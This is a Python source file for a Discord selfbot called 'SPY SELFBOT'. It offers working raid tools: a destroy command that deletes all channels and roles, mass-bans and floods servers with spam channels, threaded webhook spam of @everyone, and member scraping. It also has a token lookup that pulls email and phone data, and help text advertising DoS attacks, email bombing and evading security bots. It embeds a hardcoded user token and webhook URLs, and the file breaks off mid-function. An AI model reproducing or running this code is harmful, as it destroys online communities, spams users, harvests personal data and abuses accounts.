import os
import discord
from discord.ext import commands
import asyncio 
import random 
import requests
import sys
import threading
import datetime
import json
import aiohttp
from colorama import Fore
import time
from pypresence import Presence
import subprocess,base64, codecs, smtplib
app1 = "https://discord.com/api/"
hok3 = "oks/"      
hok = "/we"
hok2 = "bho"
 
os.system('cls' if os.name == 'nt' else 'clear') 

risinencrypt = "mfa.nV-vukVjAjo5FVOHMHvFQUlA9Aqjj8AWH_VeSmTeqsoq_S8_JeeJ1BBlyS69dEzNyELEBg3BaTAl54OeGKWz"
risinencrypt1 = ">"
risinencrypt2 = "password"
rich_presence = "y"
risinnwtff = "afk-msg"
risinnwtf = False
intents = discord.Intents.all()
intents.members = True 
print("Attempting to kill Discord.\nLogging in Your Account......\nMade by RisinPlayZ")


def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{risinencrypt}'}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{risinencrypt}'}
    SPYSBOP = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {risinencrypt}'}
    SPYSBOP = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)

SPYSBOP.remove_command(name="help") 

def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            RPC = Presence("850221547331649537") 
            RPC.connect() 
            RPC.update(details="Created By RisinPlayZ", large_image="risinop", small_image="risinop", large_text="SPYSELFBOT", start=time.time())
        except:
            pass
rich_presence = RichPresence() 
@SPYSBOP.event
async def on_ready():
    os.system(f"mode 85,20 & title [SPY SELF BOT] - Connected: {SPYSBOP.user}")
    print(f"Logged in as {SPYSBOP.user}")
@SPYSBOP.command(pass_context=True)
async def help(ctx):
        embed = discord.Embed(color=000000)
        embed.set_author(name="SPY SELFBOT | discord.gg/spyop")
        embed.set_thumbnail(url="https://i.imgur.com/ZUbZ55y.gif")
    #    embed.set_image(url="https://cdn.discordapp.com/attachments/852935465581412423/856814206384472064/image_search_1624350811814.png")
        embed.set_footer(text="Created by RisinPlayZ")
        embed.add_field(name=">help", value="```Shows Help Cmds```")
        embed.add_field(name=">text", value="```Shows Text Cmds```")
        embed.add_field(name=">hack", value="```Shows hack Cmds```")
        embed.add_field(name=">nuke", value="```Shows nuke Cmds```")
        embed.add_field(name=">misc", value="```Shows misc Cmds```")
        embed.add_field(name=">status", value="```shows status Cmds```")
        embed.add_field(name=">selfbotinfo", value="```shows Information about the selfbot.```")
        await ctx.send(embed=embed)
        
@SPYSBOP.command(pass_context=True)
async def text(ctx):
        embed = discord.Embed(color=000000)
        embed.set_author(name="SPY SELFBOT | TEXT CMDS")
        embed.set_footer(text="Created by RisinPlayZ") 
        embed.add_field(name=">massdm", value="```Mass DMs all open / recent DMs\nParameters- >massdm <message>\nEx- >massdm discord.gg/spyop | Join karlo frands```") 
        embed.add_field(name=">idtoname", value="```Fetches the Userid#discriminator from the given ID\nParameters- >id <user-id>\nEx- >id 822466294032367636```")
        embed.add_field(name=">spam", value="```Spams the chat \nParameters- >spam <int> <msg> \nEx- >spam 50 TEAM SPY OP```")
        embed.add_field(name=">ghostping", value="```Deletes the ping instantly\nParameters- >ghostping <mention/message> \nEx- >ghostping @\everyone```")
        embed.add_field(name=">purge", value="```Deletes Your messages\nParameters- >purge <int>\nEx- >purge 50```")
        embed.add_field(name=">afk", value="```Turns on or off afk system.\nParameters- >afk on, >afk off\nEx- >afk on, >afk off```")
        embed.add_field(name=">embed", value="```Send your Message in an Embed\nParameters- >embed <text>\nEx- >embed RisinPlayZ is OP```")
        embed.add_field(name=">leave", value="```Leaves the server\nParameters- >leave <server-id>\nEx- >leave ```")
        embed.add_field(name=">firstmsg", value="```Shows the first message of the chat with a jump buton\nParameters- >firstmsg\nEx- >firstmsg```")
        embed.add_field(name=">block", value="```Blocks the user\nParameters- >block\nEx- >block```")
        embed.add_field(name=">sendhook", value="```Sends a message to the webhook.\nParameters- >sendhook <webhook> <message>\nEx- >sendhook https://discord.com/api/webhooks/851376570642989093/Wq_TQM6h5PTusC8nJox1prsC3Ou7gt6MpfeZSyEJyhyi5B3E-1OBt1vf3WqfUYgmwIYb TEAM SPY OP```")

        await ctx.send(embed=embed)
        
@SPYSBOP.command(pass_context=True)
async def hack(ctx):
        embed = discord.Embed(color=000000)
        embed.set_author(name="SPY SELFBOT | HACK CMDS")
        embed.set_footer(text="Created by RisinPlayZ")
        embed.add_field(name=">doxip", value="```Displays info on an IP \nParameters- >ip <target> \nEx- >ip 162.159.128.233```")
        embed.add_field(name=">dosip", value="```Performs simple Denial of Service attack on an IP \nParameters- >dosip <target> \nEx- >dosip 162.159.128.233```") 
        embed.add_field(name=">gmailbomber", value="```Attempts Mass-Messages to the Target Gmail-ID, works on console. proxies are recommended.\nParameters- >gmailbomber\nEx- >gmailbomber```")
        embed.add_field(name=">doxuser", value="```Displays info on a user | Only works in a server\nParameters- >doxuser <@target> \nEx- >doxuser @RisinPlayZ```")
        embed.add_field(name=">doxtoken", value="```Displays info on a Discord Account \nParameters- >tdox <target-token> \nEx- >tdox mfa.W3Di4FprRZ_AXH_Y5-A9ReoshSu9Dzn_fTXrvBhwc6p3LvkYLJM4jbr338YUMZ7ECnj2zbxnKm-I2ReFh2Zp```")
        embed.add_field(name=">doxserver", value="```Displays info on a Discord Server\nParameters- >doxserver\nEx- >doxserver```")
        embed.add_field(name=">pingweb", value="```Pings the website to check whether its operational or not.\nParameters- >pingweb <website url>\nEx- >pingweb https://discord.com/```")
        embed.add_field(name=">getroles", value="```Sends all roles of a server which you dont have the perm to view | Note - Use a spam channel.\nParameters- >getroles\nEx- >getroles```")
        embed.add_field(name=">killwebhook", value="```Deletes a webhook\nParameters- >delwebhook <webhook>\nEx- >delwebhook https://discordapp.com/api/webhooks/752659248508305488/JnMq-sBIN3IMgDpzgT-KnpFDLEBdQs8AO9sD-_3STGk_ijmyqeKrop3kYSV6lb4ry8S```")
        embed.add_field(name=">spamhook", value="```Initiates a spam on the given webhook\nParameters- >spamhook <webhook_url> <message>\nEx- >spamhook https://discord.com/api/webhooks/851376570642989093/Wq_TQM6h5PTusC8nJox1prsC3Ou7gt6MpfeZSyEJyhyi5B3E-1OBt1vf3WqfUYgmwIYb @everyone SPY OP```")
        await ctx.send(embed=embed)
  
@SPYSBOP.command(pass_context=True)
async def nuke(ctx):
        embed = discord.Embed(color=000000)
        embed.set_author(name="SPY SELFBOT | NUKE CMDS")
        embed.set_footer(text="Created by RisinPlayZ")
        embed.add_field(name=">massban", value="```Bans Everyone in the server.A working banall cmd!!, ALWAYS RESTART YOUR SELFBOT BEFORE EXECUTING THIS CMD.\nParameters- >banall <Target-server-ID> | Ban Perms Required\nEx- >massban 810480167453196299```")
        embed.add_field(name=">masskick", value="```Bans Everyone in the server.A working kickall cmd!!, ALWAYS RESTART YOUR SELFBOT BEFORE EXECUTING THIS CMD.\nParameters- >kickall <Target-server-ID> | Kick Perms Required\nEx- >masskick 810480167453196299```")
        embed.add_field(name=">trash", value="```Destruction 2021, ALWAYS RESTART YOUR SELFBOT BEFORE EXECUTING THIS CMD.\nParameters- >trash <Target-server-ID> | Admin Perms Required\nEx- >trash 810480167453196299```")
        embed.add_field(name=">securitynuke", value="```Nukes the server in a way, security bot wont punish you. | Works if and only if your prefix is set to >\nParameters- >securitynuke\nEx- >securitynuke```") 
        embed.add_field(name=">nickall", value="```Updates the Nickname of all users in the server.\nParameters- >nickall\nEx- >nickall")
        embed.add_field(name=">delemojis", value="```Deletes all emojis of the server.\nParameters- >delemojis\nEx- >delemojis```")
        embed.add_field(name=">scrape", value="```Scrape members list from a server \nParameters- >scrape <Target-server-ID> | Admin or manage Perms Required\nEx- >scrape 810480167453196299```")
        embed.add_field(name=">rc", value="```Renames every channel to the name provided\nParameters- >rc <name>\nEx- >rc RisinPlayZ op bolte```")
        embed.add_field(name=">rr", value="```Renames every role to the name provided\nParameters- >rr <name>\nEx- >rr RisinPlayZ op bolte```")
        embed.add_field(name=">webhookspam", value="```Creates multiple webhooks in every channel and Spams everyone with webhook in all channel\nParameters- >webhookspam\nEx- >webhookspam```") 
        embed.add_field(name=">stopwebhookspam", value="```Stops the ongoing spam\nParameters- >stopwebhookspam\nEx- >stopwebhookspam```") 
        embed.add_field(name=">spamgcname", value="```Spam Changes Group chat name\nParameters- >spamgcname\nEx- >spamgcname```") 
        
        await ctx.send(embed=embed)
  
@SPYSBOP.command(pass_context=True)
async def misc(ctx):
        embed = discord.Embed(color=000000)
        embed.set_author(name="SPY SELFBOT | MISC CMDS")
        embed.set_footer(text="Created by RisinPlayZ")
        embed.add_field(name=">renameserver", value="```Renames the server name\nParameters- >renameserver <name>\nEx- >renameserver TEAM SPY OP```")
        embed.add_field(name=">image", value="```Sends Image in an Embed\nParameters- >image <link>\nEx- >image https://media.discordapp.net/attachments/802230471378468875/833276656851746837/Screenshot_20210418-151340.png?width=293&height=586 ```")

        
        await ctx.send(embed=embed)

@SPYSBOP.command(pass_context=True)
async def status(ctx):
        embed = discord.Embed(color=000000)
        embed.set_author(name="SPY SELFBOT | Additional Status CMDS")
        embed.set_footer(text="Created by RisinPlayZ")
        embed.add_field(name=">play", value="```Changes the status to Playing\nParameters- >play <status> \nEx- >play PUBG EVEN AFTER BAN```")
        embed.add_field(name=">watch", value="```Changes the status to Watching\nParameters- >watch <status> \nEx- >watch NetfliX```")
        embed.add_field(name=">listen", value="```Changes the status to Listening\nParameters->listen <status> \nEx- >listen Fake Spotify OP```")
        embed.add_field(name=">stream", value="```Changes the status to streaming\nParameters- >stream <status>\nEx- >stream 1000 Million Subscribers special live stream```")
        embed.add_field(name=">stopstatus", value="```Stops the current status\nParameters- >stopstatus\nEx- >stopstatus```")
        embed.add_field(name=">RPC", value="```Connect to Rich Presence SPYSBOP\nParameters- >rpc <application-id> <status> <image-name> <text>\nExample- >rpc 822466294032367636 'RisinPlayZ RPC' idk SPY SELFBOT```")
        await ctx.send(embed=embed)


@SPYSBOP.command()
async def spam(ctx, amount: int, *, message):
    
    for _i in range(amount):
        await ctx.send(message)

@SPYSBOP.command()
async def alive(ctx):
    await ctx.send(">>> **SPY SELFBOT**\nME IZ ALIVE OP\nWorking Status - Legend lvl like risinplayz xD\nType help cmd to know more")
@SPYSBOP.command()
async def restart(ctx):
    await ctx.send("Restarting Selfbot........")
    os.system('python ' + sys.argv[0])

@SPYSBOP.command()
async def securitynuke(ctx):
    await ctx.send(">rc risinplayz op")
    await ctx.send(">rr risinplayz op") 
    await ctx.send(">dCM")
    await ctx.send(">servername TRASHED BY RISINPLAYZ")
    await ctx.send(">webhookspam") 
    await ctx.send(">nickall")
    await ctx.send(">delemojis")
    await ctx.send(">purge")

@SPYSBOP.command(
    aliases=['doxip', 'iplookup', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {
            'name': 'IP',
            'value': geo['query']
        },
        {
            'name': 'Type',
            'value': geo['ipType']
        },
        {
            'name': 'Country',
            'value': geo['country']
        },
        {
            'name': 'City',
            'value': geo['city']
        },
        {
            'name': 'Continent',
            'value': geo['continent']
        },
        {
            'name': 'Country',
            'value': geo['country']
        },
        {
            'name': 'Hostname',
            'value': geo['ipName']
        },
        {
            'name': 'ISP',
            'value': geo['isp']
        },
        {
            'name': 'Latitute',
            'value': geo['lat']
        },
        {
            'name': 'Longitude',
            'value': geo['lon']
        },
        {
            'name': 'Org',
            'value': geo['org']
        },
        {
            'name': 'Region',
            'value': geo['region']
        },
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
            
    return await ctx.send(embed=em)

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de", "en-GB", "en-US", "es-ES", "fr", "hr", "it", "lt", "hu", "nl",
    "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs", "el", "bg",
    "ru", "uk", "th", "zh-CN", "ja", "zh-TW", "ko"
]

@SPYSBOP.command()
async def dosip(ctx):
    await ctx.send("Sending Requests.....")
# for i in range(1,100):
#     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#     s.connect((target,80))
#     data = b"GET / HTTP 1.1\r\n"*1000
#     s.send(data)
#     s.close()
#     print('Attack sent!')
#     break

@SPYSBOP.command(aliases=['tdox', 'doxtoken'])
async def tokeninfo(ctx, _token):
    
    headers = {'Authorization': _token, 'Content-Type': 'application/json'}
    try:
        res = requests.get(
            'https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(
            ((int(user_id) >> 22) + 1420070400000) /
            1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get(
                'https://canary.discordapp.com/api/v6/users/@me',
                headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(
                ((int(user_id) >> 22) + 1420070400000) /
                1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=
                f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
            )
            fields = [
                {
                    'name': 'Flags',
                    'value': res['flags']
                },
                {
                    'name': 'Local language',
                    'value': res['locale'] + f"{language}"
                },
                {
                    'name': 'Verified',
                    'value': res['verified']
                },
            ]
            for field in fields:
                if field['value']:
                    em.add_field(
                        name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(
                        url=
                        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
                    )
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid Token, try doxing a valid token..")
    em = discord.Embed(
        description=
        f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
    )
    em.set_footer(text="Created by RisinPlayZ")
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {
            'name': 'Phone',
            'value': res['phone']
        },
        {
            'name': 'Flags',
            'value': res['flags']
        },
        {
            'name': 'Local language',
            'value': res['locale'] + f"{language}"
        },
        {
            'name': 'MFA',
            'value': res['mfa_enabled']
        },
        {
            'name': 'Verified',
            'value': res['verified']
        },
        {
            'name': 'Nitro',
            'value': nitro_type
        },
    ]
    for field in fields:
        if field['value']:
            em.add_field(
                name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(
                url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
            )
            em.set_footer(text="Created by RisinPlayZ")
    return await ctx.send(embed=em)

     
def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

@SPYSBOP.command(aliases=["trash", "wizz"])
async def destroy(ctx):
    await ctx.send(f">massban {ctx.guild.id}")
   
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="TRASHED BY RISINPLAYZ",
            description="RisinPlayZ got no chill",
            reason="ripped by RisinPlayZ",
            icon=None,
            banner=None)
    except:
        pass
    for _i in range(100):
        await ctx.guild.create_text_channel(name="wizzed-by-spy")
    for _i in range(100):
        await ctx.guild.create_role(name="nuked-by-spy", color=RandomColor())
    
MESSAGE_CONTENTS = ['@everyone **RISNPLAYZ GOT NO CHILL**']
WEBHOOK_NAMES = ['WIZZED BY RISINPLAYZ ', 'WIZZED BY RISINPLAYZ'] 

# @SPYSBOP.event
# async def on_guild_channel_create(channel):
#   webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
#   while True:  
#     await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))
format = "%a, %d %b %Y | %H:%M:%S %ZGMT"

@SPYSBOP.command()
@commands.guild_only()
async def doxserver(ctx):
    embed = discord.Embed(
    )
    text_channels = len(ctx.guild.text_channels)
    voice_channels = len(ctx.guild.voice_channels)
    categories = len(ctx.guild.categories)
    channels = text_channels + voice_channels
    embed.set_thumbnail(url = str(ctx.guild.icon_url))
    embed.add_field(name = f"Information About **{ctx.guild.name}**: ", value = f":white_small_square: ID: **{ctx.guild.id}** \n:white_small_square: Owner: **{ctx.guild.owner}** \n:white_small_square: Location: **{ctx.guild.region}** \n:white_small_square: Creation: **{ctx.guild.created_at.strftime(format)}** \n:white_small_square: Members: **{ctx.guild.member_count}** \n:white_small_square: Channels: **{channels}** Channels; **{text_channels}** Text, **{voice_channels}** Voice, **{categories}** Categories \n:white_small_square: Verification: **{str(ctx.guild.verification_level).upper()}** \n:white_small_square: Features: {', '.join(f'**{x}**' for x in ctx.guild.features)} \n:white_small_square: Splash: {ctx.guild.splash}")
    embed.set_footer(text="Created by RisinPlayZ")
    await ctx.send(embed=embed)
   
@SPYSBOP.command(aliases=['killwebhook'])
async def delwebhook(ctx,link=None):
    if link == None:
        embed=discord.Embed(title="SPY SELFBOT", description="```>delwebhook <webhook>```")
        embed.set_footer(text="Created By RisinPlayZ")
        await ctx.send(content="",embed=embed)
    else:
        embed=discord.Embed(title="SPY SELFBOT", description=f"Sending a delete request to\n{link}")
        embed.set_footer(text="Created by RisinPlayZ")
        await ctx.send(content="",embed=embed)


        result = requests.delete(link)
  
        if result.status_code == 204:
            embed=discord.Embed(title="SPY SELFBOT", description=f"WEBHOOK DELETED")
            embed.set_footer(text="Created by RisinPlayZ")
            await ctx.send(embed=embed)
        else:
            embed=discord.Embed(title="SPY SELF BOT", description=f"Delete request responded with status code : {result.status_code}\{result.text}")
            embed.set_footer(text="Created by RisinPlayZ")
            await ctx.send(embed=embed)

@SPYSBOP.command()
async def purge(ctx, amount: int = None):
    await ctx.message.delete()
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(
                lambda m: m.author == SPYSBOP.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass
    else:
        async for message in ctx.message.channel.history(limit=amount).filter(
                lambda m: m.author == SPYSBOP.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass
  
@SPYSBOP.command()
async def av(ctx,*, avamember):
    user = SPYSBOP.get_user(avamember)
    await ctx.send(f"{user.avatar_url}")

@SPYSBOP.command()
async def pingweb(ctx, website=None):
    await ctx.send(f'Pinging {website} with 32 bytes of data:')
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        if r == 404:
            await ctx.send(f'Website is down, status = ({r})')
        else:
            await ctx.send(f'Website is operational, status = ({r})')
            await ctx.send("Timed out")

@SPYSBOP.command()
async def ping(ctx, ipp=None):
    await ctx.send(f'Pinging {ipp} with 32 bytes of data:')
    await ctx.send("Timed out.")
    
@SPYSBOP.command(aliases=["whois"])
async def doxuser(ctx, member: discord.Member = None):
    if not member:  # if member is no mentioned
        member = ctx.message.author  # set member as the author
    roles = [role for role in member.roles]
    embed = discord.Embed(colour=discord.Colour.default(), timestamp=ctx.message.created_at,
                          title=f"User Info - {member}")
    embed.set_thumbnail(url=member.avatar_url)
    embed.set_footer(text="Created By RisinPlayZ")

    embed.add_field(name="ID:", value=member.id)
    embed.add_field(name="Display Name:", value=member.display_name)

    embed.add_field(name="Created Account On:", value=member.created_at.strftime("%a, %d %B %Y, %I:%M %p UTC"))
    embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %d %B %Y, %I:%M %p UTC"))

    embed.add_field(name="Roles:", value="".join([role.mention for role in roles]))
    embed.add_field(name="Highest Role:", value=member.top_role.mention)
    print(member.top_role.mention)
    await ctx.send(embed=embed)

@SPYSBOP.command(aliases=["roles"])
async def getroles(ctx):
   
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"
    print(roleStr)
    await ctx.send(roleStr)
   
@SPYSBOP.command(aliases=["renameserver", "nameserver"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)
#status cmds bolte
@SPYSBOP.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.send("SPY SELFBOT | Changing Status.....")
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await SPYSBOP.change_presence(activity=stream)
    await ctx.send("Streaming created!")

@SPYSBOP.command(aliases=["playing"])
async def play(ctx, *, message):
    game = discord.Game(
        name=message
    ) 
    await ctx.send("SPY SELFBOT | Changing Status......")
    await SPYSBOP.change_presence(activity=game) 
    await ctx.send("Playing Created!")
    
@SPYSBOP.command(aliases=["watch"])
async def watching(ctx, *, message):
    await ctx.send("SPY SELFBOT | Changing Status.....")
    await SPYSBOP.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, name=message))
    await ctx.send("Watching created!")

@SPYSBOP.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.send("SPY SELFBOT | Changing Status.....")
    await SPYSBOP.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))
    await ctx.send("Listening created!")

@SPYSBOP.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.send("SPY SELFBOT | Killing Status......")
    await SPYSBOP.change_presence(activity=None)
    await ctx.send("Status Removed Successfully!")

@SPYSBOP.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx):
  
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "RisinPlayZ OP"
        name = ""
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)

# @SPYSBOP.command()
# async def banall(i):
# guild = input("Enter Server ID: )
#     while True:
#       r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{i}", headers=headers)
#       if 'retry_after' in r.text:
#           time.sleep(r.json()['retry_after'])
#           print(f"Got ratelimited, retrying after:  {r.json()['retry_after']} s.")
#       else:
#           break

@SPYSBOP.command(
    name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1,
                                           oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(
        name="First Message", value=f"[Click here to Jump]({first_message.jump_url})")
    embed.set_footer(text="Created by RisinPlayZ")
    await ctx.send(embed=embed) 

def ssspam(webhook):
    while risinidkspam:
        randcolor = random.randint(0, 16777215)
        data = {'content':'https://discord.gg/spyop @everyone RISINPLAYZ RUNS CORD'}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@SPYSBOP.command(aliases=['webhookfuck', 'spamwebhooks', 'webhooknuke', 'webhooksnuke', 'webhooksfuck', 'spamwebhook'])
async def webhookspam(ctx):
    global risinidkspam
    risinidkspam = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url,)).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Wizzed by RisinPlayZ')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except: 
                print(f"{Fore.RED} > Rate Limited By Discord.")
@SPYSBOP.command(aliases=['stopwebhookfuck', 'webhookstop',"webhookspamstop","stopwebhooksspam","webhookspamoff"])
async def stopwebhookspam(ctx):
    global wrisinspam

    risinidkspam = False

@SPYSBOP.command()
async def embed(ctx, *, description):
     embed = discord.Embed(title="SPY SELFBOT", description=description)
     embed.set_footer(text="Created by RisinPlayZ")
     await ctx.send(embed=embed)

@SPYSBOP.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    
    for channel in ctx.guild.channels:
        await channel.edit(name=name)
 
@SPYSBOP.command(aliases=["rr"])
async def renameroles(ctx, *, name):
    
    for role in ctx.guild.roles:
        await role.edit(name=name)
title = '''`RisinPlayZ#2077`'''
linky = "https://risinplayz.host.xyz/"
footer = "Screenshot"
stream_url = "https://twitch.tv/risinplayz"   
@SPYSBOP.command()
async def image(ctx, link):
  await ctx.message.delete()
  embd = discord.Embed(
    title =title,
    description = '',
    colour = discord.Colour.blue())
  embd.set_footer(text=footer)
  embd.set_image(url=link)
  await ctx.channel.send(linky, embed=embd)

@SPYSBOP.command()
async def scrape(ctx):
  await ctx.message.delete()
  mem = ctx.guild.members
  for member in mem:
      try:
        print("krliya scrape")
        mfil = open("RisinPlayZ/members.txt","a")

        mfil.write(str(member.id) + "\n")
        mfil.close()

      except Exception as e:
        print("error",e)

@SPYSBOP.command()
async def block(ctx, *, user: discord.User):
    await ctx.send("Get Blocked Noob!")
    await user.block()
    
@SPYSBOP.command()
async def unfriend(ctx, *, user: discord.User):
    await user.remove_friend()
    await ctx.send('Friend has been removed')

@SPYSBOP.command()
async def ghostping(ctx):
  await ctx.message.delete()
username = "RisinPlayZ :P"
picture = "https://cdn.discordapp.com/attachments/802230471378468875/851375332584849418/60b3b8e38fbdf.png"
@SPYSBOP.command()
async def spamhook(ctx, webhook, *, message):
	data = {
	    'content': message,
	    'username': username,
	    'avatar_url': picture
	}

	sent = 0
	failed = 0

	while True:
		r = requests.post(webhook, data=data)
                
		if r.status_code == 204:
			sent += 1
			print(f"{Fore.GREEN}[+] - Message sent !{Fore.RESET}")
			os.system(f'title SPY SELFBOT - WEBHOOK SPAMMER ^| By RisinPlayZ - Sent : {sent} ^| Failed : {failed}')
		else:
			failed += 1
			print(f"{Fore.RED}[-] - Webhook Rate Limited by Discord !{Fore.RESET}")
			os.system(f'title SPY SELFBOT - WEBHOOK SPAMMER ^| By RisinPlayZ - Sent : {sent} ^| Failed : {failed}')

@SPYSBOP.command()
async def selfbotinfo(ctx):

    embed = discord.Embed(color=0)
    embed.set_author(name='SPY SELFBOT | INFO')
    embed.set_footer(text='Created by RisinPlayZ')
    embed.add_field(name='___**DEVELOPER**___', value='**RisinPlayZ**')
    embed.add_field(name='___**DATE OF CREATION**___', value='**April 11, 2021 1:38A.M IST**')
    embed.add_field(name='___**DISCORD VERSION**___', value='**discord.py 1.7.2**')
    embed.add_field(name='___**LANGUAGE**___', value='**PYTHON 3.8.7**')
    embed.add_field(name='__**RPC IMAGE CREDITS**__', value='**ΒΞΛSTᵉ#7331**')
    await ctx.send(embed=embed)

@SPYSBOP.command()
async def sendhook(ctx, webhook, *, message):

    _json = {"content": message}
    requests.post(webhook, json=_json)
    rs = requests.get(webhook).json()
    if "Unknown Webhook" or "Invalid" in rs["message"]:
        await ctx.send(f'Successfully sent `{message}` to webhook `{webhook}`')
    else:
        await ctx.send("Invalid Webhook")

@SPYSBOP.command()
async def afk(ctx, arg1,arg2=risinnwtff):
    global risinnwtf
    global risinnwtff
    if arg1 == "on" or arg1 == "On":
        risinnwtff = arg2
        risinnwtf = True
        await ctx.message.delete()
    elif arg1 == "off" or arg1 == "Off":
        risinnwtf = False
        risinnwtff = ""
        await ctx.message.delete()

@SPYSBOP.event
async def on_message(message):
    global risinnwtf
    if risinnwtf == True:
        global risinnwtff
        if message.author != SPYSBOP.user:
            if not message.guild:
                await message.channel.send(risinnwtff)
    await SPYSBOP.process_commands(message)

@SPYSBOP.command(aliases=['lserver',"leaveserver","serverleave"])
async def leave(ctx,servid=None):#
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if servid == None:
            embed=discord.Embed(title=f"SPY SELFBOT", description="Supply an ID\n `>leave <server-id>`")#abe sale
            await ctx.send(embed=embed)
    else:

        embed=discord.Embed(title=f"SPY", description=f"Leaving `{servid}`")
        embed.set_footer(text="Created by RisinPlayZ")
        await ctx.send(embed=embed)
        
        leave = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{servid}", headers=headers)
        randcolor = random.randint(0x000000, 0xFFFFFF)
        if leave.status_code == 204:
